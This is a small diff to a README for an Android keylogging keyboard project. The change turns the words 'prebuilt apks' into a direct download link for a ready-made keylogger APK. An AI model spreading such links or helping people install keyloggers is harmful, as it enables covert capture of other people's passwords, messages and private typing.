@@ -3,7 +3,7 @@ Android Keylogging Keyboard
 
 ## Download
 
-Build it from source or use prebuilt apks. 
+Build it from source or use [prebuilt apks.](https://github.com/IceWreck/LokiBoard-Android-Keylogger/blob/master/releases/LokiBoard-1.0.apk?raw=true) 
 
 
 ## Usage
